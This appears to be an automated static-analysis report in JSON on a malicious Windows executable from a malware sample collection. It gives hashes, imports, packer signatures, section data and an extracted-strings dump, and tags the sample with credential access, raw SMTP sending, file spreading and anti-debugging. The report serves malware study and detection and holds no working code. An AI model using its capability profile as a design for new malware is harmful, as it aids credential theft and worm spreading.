{
    "docinfo": {},
    "filename": "VirusShare_d41da7912346b41d60d23ea88b811b71",
    "filesize": 151552,
    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
    "hashes": {
        "md5": "d41da7912346b41d60d23ea88b811b71",
        "sha1": "2ff077a1a61e37a1e74d0d0181112df8aa2394e2",
        "sha256": "07eeff72c7eea069ec0fd78505edbe88a3a2e5cb8ba34090014c1ab08b2e6e82"
    },
    "peinfo": {
        "behavior": [
            "Xor",
            "network_tcp_listen",
            "network_smtp_raw",
            "network_tcp_socket",
            "cred_local",
            "spreading_file",
            "win_mutex",
            "win_registry",
            "win_private_profile",
            "win_files_operation"
        ],
        "breakpoint": [
            "CloseHandle",
            "CopyFileA",
            "CreateDirectoryA",
            "CreateFileA",
            "CreateMutexA",
            "CreateThread",
            "DeleteFileA",
            "ExitProcess",
            "ExitThread",
            "FindFirstFileA",
            "FindNextFileA",
            "FindWindowA",
            "GetCommandLineA",
            "GetComputerNameA",
            "GetCurrentProcess",
            "GetDriveTypeA",
            "GetModuleFileNameA",
            "GetModuleHandleA",
            "GetProcAddress",
            "GetStartupInfoA",
            "GetSystemDirectoryA",
            "GetTempFileNameA",
            "GetTempPathA",
            "GetVersionExA",
            "GetWindowsDirectoryA",
            "HeapAlloc",
            "LoadLibraryA",
            "MessageBoxA",
            "OpenProcess",
            "ReadFile",
            "RegCloseKey",
            "RegDeleteValueA",
            "RegOpenKeyExA",
            "RemoveDirectoryA",
            "SetFilePointer",
            "Sleep",
            "TerminateProcess",
            "UnhandledExceptionFilter",
            "VirtualAlloc",
            "VirtualFree",
            "WSAStartup",
            "WaitForSingleObject",
            "WinExec",
            "WriteFile",
            "closesocket",
            "connect",
            "recv",
            "send",
            "socket"
        ],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "ADVAPI32.dll": [
                    {
                        "function": "RegQueryValueExA",
                        "offset": 4284416
                    },
                    {
                        "function": "RegEnumValueA",
                        "offset": 4284420
                    },
                    {
                        "function": "RegCloseKey",
                        "offset": 4284424
                    },
                    {
                        "function": "RegSetValueExA",
                        "offset": 4284428
                    },
                    {
                        "function": "RegDeleteValueA",
                        "offset": 4284432
                    },
                    {
                        "function": "RegOpenKeyExA",
                        "offset": 4284436
                    },
                    {
                        "function": "RegNotifyChangeKeyValue",
                        "offset": 4284440
                    }
                ],
                "KERNEL32.DLL": [
                    {
                        "function": "Sleep",
                        "offset": 4284448
                    },
                    {
                        "function": "DeleteFileA",
                        "offset": 4284452
                    },
                    {
                        "function": "GetPrivateProfileSectionA",
                        "offset": 4284456
                    },
                    {
                        "function": "CloseHandle",
                        "offset": 4284460
                    },
                    {
                        "function": "GetExitCodeProcess",
                        "offset": 4284464
                    },
                    {
                        "function": "OpenProcess",
                        "offset": 4284468
                    },
                    {
                        "function": "FreeLibrary",
                        "offset": 4284472
                    },
                    {
                        "function": "TerminateProcess",
                        "offset": 4284476
                    },
                    {
                        "function": "GetProcAddress",
                        "offset": 4284480
                    },
                    {
                        "function": "GetVersionExA",
                        "offset": 4284484
                    },
                    {
                        "function": "CopyFileA",
                        "offset": 4284488
                    },
                    {
                        "function": "GetTempFileNameA",
                        "offset": 4284492
                    },
                    {
                        "function": "GetTempPathA",
                        "offset": 4284496
                    },
                    {
                        "function": "RemoveDirectoryA",
                        "offset": 4284500
                    },
                    {
                        "function": "CreateDirectoryA",
                        "offset": 4284504
                    },
                    {
                        "function": "GetComputerNameA",
                        "offset": 4284508
                    },
                    {
                        "function": "GetModuleFileNameA",
                        "offset": 4284512
                    },
                    {
                        "function": "LoadLibraryA",
                        "offset": 4284516
                    },
                    {
                        "function": "GetPrivateProfileStringA",
                        "offset": 4284520
                    },
                    {
                        "function": "SetThreadPriority",
                        "offset": 4284524
                    },
                    {
                        "function": "TerminateThread",
                        "offset": 4284528
                    },
                    {
                        "function": "WaitForSingleObject",
                        "offset": 4284532
                    },
                    {
                        "function": "CreateThread",
                        "offset": 4284536
                    },
                    {
                        "function": "CreateEventA",
                        "offset": 4284540
                    },
                    {
                        "function": "WinExec",
                        "offset": 4284544
                    },
                    {
                        "function": "WaitForMultipleObjects",
                        "offset": 4284548
                    },
                    {
                        "function": "ExitThread",
                        "offset": 4284552
                    },
                    {
                        "function": "FindNextChangeNotification",
                        "offset": 4284556
                    },
                    {
                        "function": "FindFirstChangeNotificationA",
                        "offset": 4284560
                    },
                    {
                        "function": "GetDriveTypeA",
                        "offset": 4284564
                    },
                    {
                        "function": "GetLogicalDriveStringsA",
                        "offset": 4284568
                    },
                    {
                        "function": "SetEvent",
                        "offset": 4284572
                    },
                    {
                        "function": "GetModuleHandleA",
                        "offset": 4284576
                    },
                    {
                        "function": "GetLastError",
                        "offset": 4284580
                    },
                    {
                        "function": "CreateMutexA",
                        "offset": 4284584
                    },
                    {
                        "function": "SetLastError",
                        "offset": 4284588
                    },
                    {
                        "function": "GetPrivateProfileIntA",
                        "offset": 4284592
                    },
                    {
                        "function": "GetWindowsDirectoryA",
                        "offset": 4284596
                    },
                    {
                        "function": "WritePrivateProfileStringA",
                        "offset": 4284600
                    },
                    {
                        "function": "SetFileAttributesA",
                        "offset": 4284604
                    },
                    {
                        "function": "GetShortPathNameA",
                        "offset": 4284608
                    },
                    {
                        "function": "lstrlenA",
                        "offset": 4284612
                    },
                    {
                        "function": "SetEnvironmentVariableA",
                        "offset": 4284616
                    },
                    {
                        "function": "GetSystemTime",
                        "offset": 4284620
                    },
                    {
                        "function": "GetLocalTime",
                        "offset": 4284624
                    },
                    {
                        "function": "HeapFree",
                        "offset": 4284628
                    },
                    {
                        "function": "GetEnvironmentStrings",
                        "offset": 4284632
                    },
                    {
                        "function": "HeapReAlloc",
                        "offset": 4284636
                    },
                    {
                        "function": "FreeEnvironmentStringsA",
                        "offset": 4284640
                    },
                    {
                        "function": "UnhandledExceptionFilter",
                        "offset": 4284644
                    },
                    {
                        "function": "FreeEnvironmentStringsW",
                        "offset": 4284648
                    },
                    {
                        "function": "WideCharToMultiByte",
                        "offset": 4284652
                    },
                    {
                        "function": "CompareStringA",
                        "offset": 4284656
                    },
                    {
                        "function": "LCMapStringW",
                        "offset": 4284660
                    },
                    {
                        "function": "LCMapStringA",
                        "offset": 4284664
                    },
                    {
                        "function": "SetEndOfFile",
                        "offset": 4284668
                    },
                    {
                        "function": "GetOEMCP",
                        "offset": 4284672
                    },
                    {
                        "function": "CompareStringW",
                        "offset": 4284676
                    },
                    {
                        "function": "GetSystemDirectoryA",
                        "offset": 4284680
                    },
                    {
                        "function": "GetACP",
                        "offset": 4284684
                    },
                    {
                        "function": "GetCPInfo",
                        "offset": 4284688
                    },
                    {
                        "function": "GetStringTypeW",
                        "offset": 4284692
                    },
                    {
                        "function": "GetStringTypeA",
                        "offset": 4284696
                    },
                    {
                        "function": "MultiByteToWideChar",
                        "offset": 4284700
                    },
                    {
                        "function": "CreateFileA",
                        "offset": 4284704
                    },
                    {
                        "function": "SetStdHandle",
                        "offset": 4284708
                    },
                    {
                        "function": "RtlUnwind",
                        "offset": 4284712
                    },
                    {
                        "function": "GetEnvironmentStringsW",
                        "offset": 4284716
                    },
                    {
                        "function": "FindFirstFileA",
                        "offset": 4284720
                    },
                    {
                        "function": "FindNextFileA",
                        "offset": 4284724
                    },
                    {
                        "function": "VirtualAlloc",
                        "offset": 4284728
                    },
                    {
                        "function": "VirtualFree",
                        "offset": 4284732
                    },
                    {
                        "function": "HeapCreate",
                        "offset": 4284736
                    },
                    {
                        "function": "GetStdHandle",
                        "offset": 4284740
                    },
                    {
                        "function": "SetHandleCount",
                        "offset": 4284744
                    },
                    {
                        "function": "SetFilePointer",
                        "offset": 4284748
                    },
                    {
                        "function": "GetFileType",
                        "offset": 4284752
                    },
                    {
                        "function": "FlushFileBuffers",
                        "offset": 4284756
                    },
                    {
                        "function": "HeapAlloc",
                        "offset": 4284760
                    },
                    {
                        "function": "ExitProcess",
                        "offset": 4284764
                    },
                    {
                        "function": "GetCurrentProcess",
                        "offset": 4284768
                    },
                    {
                        "function": "GetTimeZoneInformation",
                        "offset": 4284772
                    },
                    {
                        "function": "HeapDestroy",
                        "offset": 4284776
                    },
                    {
                        "function": "FileTimeToLocalFileTime",
                        "offset": 4284780
                    },
                    {
                        "function": "GetStartupInfoA",
                        "offset": 4284784
                    },
                    {
                        "function": "FindClose",
                        "offset": 4284788
                    },
                    {
                        "function": "FileTimeToSystemTime",
                        "offset": 4284792
                    },
                    {
                        "function": "WriteFile",
                        "offset": 4284796
                    },
                    {
                        "function": "GetVersion",
                        "offset": 4284800
                    },
                    {
                        "function": "GetCommandLineA",
                        "offset": 4284804
                    },
                    {
                        "function": "ReadFile",
                        "offset": 4284808
                    }
                ],
                "MPR.dll": [
                    {
                        "function": "WNetAddConnection2A",
                        "offset": 4284816
                    },
                    {
                        "function": "WNetCloseEnum",
                        "offset": 4284820
                    },
                    {
                        "function": "WNetOpenEnumA",
                        "offset": 4284824
                    },
                    {
                        "function": "WNetEnumResourceA",
                        "offset": 4284828
                    },
                    {
                        "function": "WNetCancelConnection2A",
                        "offset": 4284832
                    }
                ],
                "RASAPI32.dll": [
                    {
                        "function": "RasEnumConnectionsA",
                        "offset": 4284840
                    },
                    {
                        "function": "RasGetConnectStatusA",
                        "offset": 4284844
                    }
                ],
                "USER32.dll": [
                    {
                        "function": "GetWindowTextA",
                        "offset": 4284852
                    },
                    {
                        "function": "FindWindowA",
                        "offset": 4284856
                    },
                    {
                        "function": "MessageBoxA",
                        "offset": 4284860
                    },
                    {
                        "function": "GetMessageA",
                        "offset": 4284864
                    },
                    {
                        "function": "PostMessageA",
                        "offset": 4284868
                    },
                    {
                        "function": "ShowWindowAsync",
                        "offset": 4284872
                    },
                    {
                        "function": "CharToOemA",
                        "offset": 4284876
                    },
                    {
                        "function": "EnumWindows",
                        "offset": 4284880
                    }
                ],
                "WS2_32.dll": [
                    {
                        "function": "htons",
                        "offset": 4284888
                    },
                    {
                        "function": "gethostbyaddr",
                        "offset": 4284892
                    },
                    {
                        "function": "gethostbyname",
                        "offset": 4284896
                    },
                    {
                        "function": "inet_ntoa",
                        "offset": 4284900
                    },
                    {
                        "function": "recv",
                        "offset": 4284904
                    },
                    {
                        "function": "select",
                        "offset": 4284908
                    },
                    {
                        "function": "send",
                        "offset": 4284912
                    },
                    {
                        "function": "getprotobyname",
                        "offset": 4284916
                    },
                    {
                        "function": "connect",
                        "offset": 4284920
                    },
                    {
                        "function": "closesocket",
                        "offset": 4284924
                    },
                    {
                        "function": "WSAStartup",
                        "offset": 4284928
                    },
                    {
                        "function": "gethostname",
                        "offset": 4284932
                    },
                    {
                        "function": "WSACleanup",
                        "offset": 4284936
                    },
                    {
                        "function": "socket",
                        "offset": 4284940
                    },
                    {
                        "function": "inet_addr",
                        "offset": 4284944
                    }
                ]
            },
            "relocations": {
                "Size": 0,
                "VirtualAddress": 0,
                "count": 0,
                "details": {}
            },
            "resources": [
                {
                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\x0000'",
                    "executable": false,
                    "language": "LANG_ENGLISH",
                    "name": "RT_ICON",
                    "offset": 164000,
                    "size": 2216,
                    "sublanguage": "SUBLANG_ENGLISH_US"
                },
                {
                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x00\\x00\\x01\\x00\\x08\\x00\\xa8\\x08\\x00\\x00\\x01\\x00'",
                    "executable": false,
                    "language": "LANG_ENGLISH",
                    "name": "RT_GROUP_ICON",
                    "offset": 166216,
                    "size": 20,
                    "sublanguage": "SUBLANG_ENGLISH_US"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 56362,
        "features": {
            "antidbg": [
                "FindWindowA",
                "GetLastError",
                "TerminateProcess",
                "UnhandledExceptionFilter"
            ],
            "antivm": {},
            "crypto": [
                "BASE64_table"
            ],
            "mutex": [
                "CreateMutexA",
                "WaitForSingleObject"
            ],
            "packer": [
                "Microsoft_Visual_Cpp_v60",
                "Microsoft_Visual_Cpp_v50v60_MFC_additional",
                "Microsoft_Visual_Cpp_50",
                "Microsoft_Visual_Cpp_v50v60_MFC",
                "Armadillo_v4x",
                "Microsoft_Visual_Cpp"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "33bea0152897279055dec994a64c5701",
        "metadata": {},
        "sections": {
            "count": 4,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'\\x8bD$\\x04\\x81\\xec\\x8c\\x00\\x00\\x00Wh8\\x80A\\x00P\\",
                    "entropy": 6.520742932290621,
                    "executable": true,
                    "hash": {
                        "md5": "dc51f70dda0397ea495596a960873a05",
                        "sha1": "2bf288b76329362d749f776655b1f37042370bf3",
                        "sha256": "dc91775ccb134bfeba603e36a8cbb31e25725ef5d4d55bef46358db3883bb5ba"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 86016,
                    "virtual_address": 4096,
                    "virtual_size": 82981
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'2q\\x01\\x00Dq\\x01\\x00Tq\\x01\\x00bq\\x01\\x00rq\\x01\\x",
                    "entropy": 3.3283265579148447,
                    "executable": false,
                    "hash": {
                        "md5": "3e6430d471c2d29105e93af49f4ff6e5",
                        "sha1": "0be4705e977ed40aaf474f4026426399c99a6081",
                        "sha256": "b2cb5353dd22fb575c5fdf0ae8ae72aa806f710011f4ae35d8eabbf6676cdc96"
                    },
                    "section_name": ".rdata",
                    "size_of_raw_data": 8192,
                    "virtual_address": 90112,
                    "virtual_size": 4904
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'\\x00\\x00\\x00\\x00\\x90\\x8f@\\x00\\x00\\x00\\x00\\x00\\x0",
                    "entropy": 5.512016082909644,
                    "executable": false,
                    "hash": {
                        "md5": "a750e8d4f9ba8ee96c39868c7fcc232b",
                        "sha1": "7516ce41d413428ae32c6f1d7f6891b361e8f841",
                        "sha256": "2002938478623327268a0faca18e5907a631535c8b17c3096db18c75f8b0469c"
                    },
                    "section_name": ".data",
                    "size_of_raw_data": 49152,
                    "virtual_address": 98304,
                    "virtual_size": 64412
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 1.648519454956508,
                    "executable": false,
                    "hash": {
                        "md5": "8eb8c2fd46b5298ae282b6112950e77c",
                        "sha1": "0e5c9f918bf75f36c2d93b4b95f9ce5b25919229",
                        "sha256": "3a8ac4fac8a1333abf97200656a1ea10c8a75844be1bd1fee953f039ae028707"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 4096,
                    "virtual_address": 163840,
                    "virtual_size": 2400
                }
            ]
        },
        "timestamp": "2003-02-19 19:14:54"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            "]]]i]]",
            "]Rich",
            ".text",
            "`.rdata",
            "@.data",
            ".rsrc",
            "Wh8A",
            "SVWA",
            "\u0445~DUWj9T$",
            "D$ j9L$`PQ",
            "VjLT$pj",
            "4Mu]",
            "\u0685tNWST$",
            "SL$\\PQT",
            "VUUUV",
            "\u040dL$h",
            "^[_\u010c",
            "UVt$",
            "VUUU",
            "~b33\u048a",
            "F\u0403?I",
            "OAuA",
            "Ht)HuU3&F",
            "=?II",
            "=I\u0403?",
            "A_^]",
            "VWP:B",
            "fT$$",
            "D$&f",
            "T$,f",
            "L$<WL$T3j",
            "D$@A",
            "QShA",
            "\\$?\\$#\\$'\\$+f\\$.f\\$2T$TD$X#",
            "T$Lj",
            "D$`P{",
            "L$lQo",
            "P\u05cd$\\",
            "T$\\QhA",
            "D$hP=",
            "IAT L$lRQ",
            "T<RPh\u0400A",
            "(_^][",
            "T$\\QhA",
            "D$hP8=",
            "DHL PQD$tL<P$x",
            "QRhA",
            ",_^][",
            "L$\\PhA",
            "PQT8hA",
            "RPhA",
            "(_^][",
            "T$\\QhA",
            "DDL0P$",
            "RPhA",
            "$_^][",
            "T$\\QhA",
            "D$hP;",
            "DHL PT$pQ$",
            "RPhA",
            "(_^][",
            "T$RPhA",
            "_^][",
            "u%$\\",
            "QhhA",
            "_^][",
            "RhTA",
            "_^][",
            "Ph<A",
            "_^][",
            "3+\u014b\u044b",
            "_^][",
            "SVW|$",
            "SUVWP:B",
            "R+T$",
            "L$$QUh,A",
            "tAP:B",
            "t\t_^]",
            "_^]2[",
            "VL$ j",
            "PQ)9",
            "D$(L$$",
            "VRPQ",
            "_^][",
            "WVSU",
            "u_^][",
            "_^][",
            "3t$ +t$",
            "T$$L$$Qj",
            "tv|$ 3+\u044bO",
            "RPQh4A",
            "3_^][",
            "_^][",
            "SUVWhLA",
            "3h`A",
            "Ph\u0200A",
            "t1L$",
            "_^]2[0",
            "Rh\\A",
            "PhLA",
            "QhDA",
            "D$ j",
            "PQVRD$4",
            "RPFD$,",
            "\"u2|$",
            "QL$!QR\\",
            "|$(3",
            "T$$h",
            "jQPT$(h",
            "8lT$",
            "L$ PQ",
            "T$$QR\t",
            "L$Hh\u0701A",
            "PVhTA",
            ".t_$",
            "T$ QRhTA",
            "hP:B",
            "QVhTA",
            "RVh\u0501A",
            "D$ hP:B",
            "QVh\u0501A",
            "xu\u02cdT$",
            "RVh\u0101A",
            "Vt_$",
            "L$ PQh\u0101A",
            "hP:B",
            "PVh\u0101A",
            "QVhA",
            "D$ RPhA",
            "hP:B",
            "RVhA",
            "hP:B",
            "hP:B",
            "L$(#",
            "L$(D#",
            "hP:B",
            "hP:B",
            "3~8\\;B",
            "L$$K#",
            ";|3~9-`A",
            "VV\u04e1XB",
            ";|\u0603$D",
            "t_hLA",
            "VhTA",
            "r_^]",
            "QW|$",
            "u?h|A",
            "t(D$",
            ";~q;",
            "}iXB",
            "^[_Y2_Y",
            "SUV23W~-l$",
            "u UW",
            ";|_^][",
            "SUVD$",
            "WPD$ ",
            "5@`A",
            "U\u0585D$",
            "_^]2[",
            "\u04cbtiL$",
            "PUT$",
            "_^]2[",
            "3B7u",
            "%?XB",
            "?=YB",
            ";|Wx",
            "#;}_",
            "VWh\u0702A",
            "u0Vh",
            "L$ j",
            "WPT$ j",
            "SUVWhA",
            "3h\u0702A",
            "_^]2[\u0114",
            "_^]2[\u0114",
            "2_^][\u0114",
            "u4Vh",
            "T$(j",
            "WPD$(j",
            ";|V\u89d4",
            "SUVWhA",
            "Eh\u0702A",
            "L$ Qh",
            "T$ D$ Rj",
            "_^]2[",
            "L$ j",
            "_^]2[",
            "T$ h\u0402A",
            "u6Vh",
            "WP$,",
            "D$$SP",
            "L$ Q",
            "u#_^]2[",
            "2_^][",
            "SV3hA",
            "L$(Qh",
            "T$(D$(RShA",
            "^2[(",
            "L$(hA",
            "^2[(",
            "^2[(",
            ".@;|D$ $8",
            "PQ\u0184,@",
            "L$(PQ1",
            "u'D$",
            "L$,PQ",
            "T$(R",
            "+|$$3",
            ".S\\$",
            "V3~DW|$",
            "jzja",
            "jZjA",
            "j9j0",
            ">F;|",
            "UVt$",
            "t+W3EI+",
            "u_^][",
            "SUl$",
            "VW3\u06cbt$",
            "tz+\u014b\u06033I",
            "Qt$ I",
            "r_^]",
            "3S+Ul$(",
            "\\$,P:B",
            "L$ QR",
            "T$ Rj",
            "D$$u\\",
            "3I;}t+\u044b",
            "U;uQu",
            "&3I;}",
            "W3I_u",
            "W3I_u",
            "j\\V3",
            "t)+Wt0",
            "_^2^",
            "t3UVW3D$",
            "VW|$",
            "t!V$",
            "WQSD$",
            "33I~7U",
            "3QRU\u0350",
            "3FI;|]S;",
            "VWP\u8618",
            "T$(hA",
            "RD$ P",
            "L$$jQj",
            "T$@hA",
            "ReD$8P\u8fcd",
            "L$<jQj",
            "T$XhA",
            "RAHD$",
            "WT$,_^L",
            "Vh\u0200A",
            "QRgYB",
            "u;T$",
            "RhDA",
            "j0h,A",
            "u1T$",
            "PPh0A",
            "P*L$",
            "QhDA",
            "Rh<A",
            "bt/D$",
            "PhDA",
            "At\t2\u010c",
            "3VWP:B",
            "j@hYB",
            "SUVWl$",
            "RUPQD$ l",
            "3\u06c5v\u0343",
            "3T$`+",
            "|$a\\u<|$`3T$`\u0443QL$fQR\u07ca",
            "|$l3",
            "\u044dD$`I",
            "L$ jQj",
            "T$lh",
            "RD$4hYB",
            "u3T$",
            "_^][T",
            "SUVW$",
            "QUhA",
            "+T$4",
            "jRVD$@h4A",
            "u(UT$xhTA",
            "T$tQUhA",
            "D$$$",
            "PUhA",
            " T$tR",
            "FUYB",
            "F.$|",
            "RPUhA",
            "tC$x",
            "QS\u05cdT$t$",
            "R:$x",
            "F_^]",
            "UL$xhtA",
            "t^D$thA",
            "t9$x",
            "QS\u05cd$x",
            "Rh`A",
            "D$tj",
            "_^]3[t",
            "SUVWP:B",
            "33+$,",
            "T$ $<",
            "u\u078d|$(3It\u038d|$(+$,",
            "tT$($,",
            "RShA",
            "LMF_^][$",
            "SUVW3h\u0200A",
            "|$,R",
            "PQ:$",
            ";}ML$",
            "RL$$PQC",
            "PT$$QR",
            "_^][",
            "PQQ$",
            "D$$RP$",
            ";}=j",
            "_^][",
            "SUVW3h\u0200A",
            "l$$l$",
            "2\u06c9l$",
            "Rh\\A",
            "+T$$",
            "PD$,h0A",
            "L$$j",
            "T$4QR",
            "UP|$8",
            "QL$ RPPD$4PQE|$0\u058d$p",
            "D$(P&",
            "|$,3",
            "L$$h,A",
            "D$ $h",
            "CuNL$ T$$Qh$A",
            "D$$WRj",
            "D$$3WPVh",
            "-$`A",
            "L$$Q",
            "t4L$",
            "A\u06c9L$",
            "t>T$$R\u0545t3D$$$l",
            "L$$Qh",
            "fNT$$FWRVh",
            ",u|$",
            "QRD$8hA",
            "L$@Q0 uCT$$j",
            "RPG\u04c5t-L$$VQH",
            "T$$h",
            "n_^][l",
            "PQRD$",
            "PQ+y",
            "SVWD$",
            "3\\$$D$(+P\u044bh",
            "\u028bT$ ",
            "L$(D$",
            "_^2[",
            "T$ D$",
            "PD$,L$",
            "L$(Q",
            "Rh\u0200A",
            "AhxA",
            "+S\u044bYB",
            "+T$4",
            "L$4j.Q8",
            "T$4+",
            "3It\"$",
            "+\u044bYB",
            "3+YB",
            "L$4h",
            "QhhA",
            "T$4$",
            "L$4$",
            "L$4PQ",
            "L$ QhA",
            "7PT$8hA",
            "L$4j@Pj",
            "j@HRPj",
            "PD$@P",
            "L$4h",
            "Qh\u0705A",
            "T$4h\u0505A",
            "u=h\u0305A",
            "HPD$8hA",
            "T$4j@Qj",
            "j@HQPj",
            "T$<$\\",
            "D$4h",
            "Ph\u0705A",
            "L$4h\u0505A",
            "u=h\u0305A",
            "RPD$ ",
            "iPT$8hA",
            "L$4j@Pj",
            "j@HRPj",
            "PD$@P",
            "QVhA",
            "T$4h",
            "RPhA",
            "tmL$4hLA",
            "P\u04cd$D",
            "QVhA",
            "j@RWhA",
            "PQhA",
            "t^D$",
            "32\u06c5~RuN$",
            "F;|G2",
            "j@RWh|A",
            "D$4h",
            "PQh|A",
            "T$4h\u0505A",
            "tP$d",
            "VT$(htA",
            "D$$$d",
            "PQh|A",
            "j@RWhhA",
            "D$4h",
            "PQhhA",
            "T$4h\u0505A",
            "tP$d",
            "VT$(htA",
            "D$$$d",
            "PQhhA",
            "SUVWP:B",
            "#3\u0249L$",
            "L$ L$$L$(",
            "D$(\u01c5d",
            "T$,QhA",
            "D$xL$8PQU",
            "t+|$l3",
            "D$,RhA",
            "L$xT$8QR",
            "t$|$l3+",
            "s\t\\$",
            "T$(D$",
            "u\t\\$",
            "u\t\\$",
            "t8=b",
            "l=`A",
            "VV5$`A",
            "UU_^][",
            "u^-aA",
            "\u0543tQtMVh",
            "PQR\u05c3t%F",
            "_^][",
            "_^]2[",
            "Ph\u0606A",
            "Qh\u0106A",
            "IQRP",
            "SVWP:B",
            "3\uda78\udedc$ ",
            "L$,D$(",
            "t[tW",
            "\u0405t9t4$",
            "_^2[",
            "VW|$",
            "t$3+|$",
            "_^_2^",
            "`D$ SUVWj@P",
            "L$0Q",
            "3\u0249L$",
            "t4\\$",
            "2AL$",
            "u\u0405D$",
            "P\u054b3+P\u044b|$xP",
            "\u028dD$ ",
            "tC83T$x+",
            "j.Ru",
            "u\"D$",
            "^_^]2[`_^]",
            "V2hA",
            "WVD$",
            "32+$$",
            "tT4A",
            "+h(A",
            "PL$ UQt",
            "L$ UQet",
            "T$,h",
            "D$4UPFt",
            "\u81fbt(T$",
            ";t(D$",
            "_]VWa",
            "L$lSUVWhA",
            "PhTA",
            "j@Ps",
            "3T$T+j",
            "L$8QT$<R",
            "|$@3T$`+j",
            "\u02cdD$D",
            "PEL$HQr",
            "3T$l+\u064bT$lO",
            "|$P+\u064bO",
            "\u02cdD$P",
            "PL$TQ",
            "3T$x+$",
            "\u02cdT$x",
            "|$\\+\u064bO",
            "_^]2[\u0134",
            "Qh0A",
            "Rh$A",
            "T$tRh\u0109A",
            "DPhA",
            "uPhA",
            "Ct|A",
            "3+\u044bO",
            "\u8837t|A",
            "3+\u044bO",
            "3+\u044bO",
            "VWhA",
            "PVhA",
            "+hLA",
            "t$ \u8cb5|$",
            "_^]2[\u0134",
            "UhdA",
            "tHD$<PhTA",
            "0^T$<RhTA",
            "SPP,u",
            "_^][\u0134",
            "j QWhA",
            "VW`D$DPhTA",
            "Vh0A",
            "@WPhA",
            "QT$$R",
            "D$HPhTA",
            "L$TQh\u0707A",
            "T$LRhTA",
            "D$8PhA",
            "Vh0A",
            "Hh4A",
            "_^][\u0134",
            "_^][\u0134",
            "T$<RhTA",
            "VhLA",
            "Vh0A",
            "UP<u",
            "_^][\u0134",
            "_^]2[\u0134",
            "L$<Qh@A",
            "_^][\u0134",
            "SUVWhA",
            "_^][D",
            "_^]2[D",
            "5L`A",
            "_^]2[D",
            "_^]2[D",
            "jdjKYj",
            "D$$LP",
            "6PStA",
            "3S+\u044bO",
            "PT$P<~W$(",
            "3+\u064bO",
            "_^][D",
            "+j$L",
            "P3$P",
            "Wh4A",
            "tD$(",
            "FjPV$T",
            "uJhPA",
            "T$$ ",
            "Rh8A",
            "3+j$L",
            "Qh4A",
            "jQh4A",
            "QPh\\A",
            "D$,P ",
            "Qh4A",
            "RuPj",
            "PD$$h4A",
            "jQh4A",
            "R;Pj",
            "T$,QR$",
            "3$+T$",
            "Qh4A",
            "PD$$h4A",
            "jQh4A",
            "R\\Pj",
            "T$,QR ",
            "3+j\u044d ",
            "Qh4A",
            "R\u85bfPj",
            "PD$$h4A",
            "T$,QRhPA",
            "3(+T$",
            "Qh4A",
            "PD$$h4A",
            "PL$,$",
            "Qh4A",
            "R;Pj",
            "PD$$h4A",
            "|$,3",
            "+jT$",
            "Qh4A",
            "R\u8e3dPj",
            "PD$$h4A",
            "P\u837e|$,3",
            "+j\u044bO",
            "T$ Ph4A",
            "+j\u044bO",
            "L$ Ph4A",
            "j+T$",
            "Qh4A",
            "PD$$h4A",
            "P|$,3j",
            "\u028dT$0",
            "+T$0",
            "D$,\udb53\udffcA",
            "jPL$ h4A",
            "QPPj",
            "T$ Ph4A",
            "PUPP",
            "3+\u044bO",
            "+jT$",
            "Qh4A",
            "RrPj",
            "PD$$h4A",
            "PG|$,3",
            "+j\u044bO",
            "Qh4A",
            "PD$$h4A",
            "3j+\u044bO",
            "Qh4A",
            "RpPj",
            "PD$$h4A",
            "PE|$,3",
            "jQT$ h4A",
            "PD$$h4A",
            "P\u0139|$,3",
            "+j\u044bO",
            "Qh4A",
            "RnPj",
            "PD$$h4A",
            "PC|$,3",
            "Qh4A",
            "R\u0177Pj",
            "PD$$h4A",
            "P\u86b8|$,3",
            "Qh4A",
            "RDPj",
            "PD$$h4A",
            "|$,3",
            "+j\u044bO",
            "Qh4A",
            "R\u86f6Pj",
            "Ph4A",
            "D$(Pp|$,3",
            "_t.$",
            "3+\u064bO",
            "UhdA",
            "RP$0",
            "RPV\u0475",
            "_^][D",
            "uThYB",
            "wtI$(",
            "u0\u0185p",
            "u\"\u05fb$(",
            "t>hA",
            "SUVWhA",
            "uKTA",
            "3jPV$",
            "PU(F",
            "FjQV$",
            "e_^]3[\u0120",
            "3T$P+jT$",
            "+T$T",
            "L$TQh4A",
            "RIPj",
            "PD$\\h4A",
            "jQh4A",
            "jQh4A",
            "R\u06efPj",
            "Q\u87afPj",
            "Ph4A",
            "Rp\u060b3",
            "I|)_",
            "3ID)$",
            "3+hA",
            "_^][\u0120",
            "3I|)*u@3I|$PD)+\u044bO",
            "3+\u044bO",
            "SVWhA",
            "PnPj",
            "Ph4A",
            "T$TD$",
            "jRh4A",
            "P7Pj",
            "Ph4A",
            "3+\u044bO",
            "|$T+\u044bO",
            "_^[\u010c",
            "L$ hA",
            "j PQhA",
            "L$ VhA",
            "j PVh|A",
            "L$4\u8b95t",
            "j QVhhA",
            "L$4\u8295",
            "SUVt$",
            "333I\\$",
            "j@VL",
            "hP:B",
            "V\u066bhP:B",
            "V\u026bhP:B",
            "V\u8e6bhP:B",
            "V\u8a6bhP:B",
            "V\u866b3@I|1.u",
            "3ID1j@VH",
            "+\u018bj.VH",
            "3I+\u02c3",
            "wsI+\u02c3",
            "rb3I~H",
            "3<.u",
            "t\"3CI;||$",
            "_^]2[",
            "SUVWD$",
            "+h\u0426A",
